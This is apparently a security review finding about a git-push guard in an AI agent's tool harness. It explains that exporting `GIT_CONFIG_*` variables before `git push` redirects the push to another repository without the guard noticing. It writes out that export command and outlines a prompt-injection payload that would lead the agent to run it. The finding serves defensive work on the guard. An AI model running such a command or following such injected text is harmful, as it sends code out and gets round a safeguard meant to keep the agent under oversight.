  Line or code reference: _guarded_git_invocations (the prefix-assignment loop around lines 350-360 that sets `config_override`) and _evaluate_bash (the `if invocation.subcommand == "push" and invocation.config_override` branch around line 1319-1326, plus the confirmation prompt message near line 1409-1416)
  PROBLEM: The new `config_override` detection only fires when a `GIT_CONFIG_*` assignment appears as a prefix on the same command segment as the `git push` invocation. The parser does not propagate shell-environment state across command segments, so a prior `export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/other/repo` (whether separated from `git push` by `;` in the same Bash call, or in a previous Bash tool invocation that persists in the same shell session) silently sets the override for the subsequent `git push` without the guard ever seeing a `GIT_CONFIG_*` token on the git command line.
  WHY: A prompt-injection payload that tells the agent to run a one-line `export …; git push origin HEAD:feature/x` (or two Bash calls back-to-back) lands on the same shell session. The push is redirected by Git but authorized by the guard against the local origin's PR history.
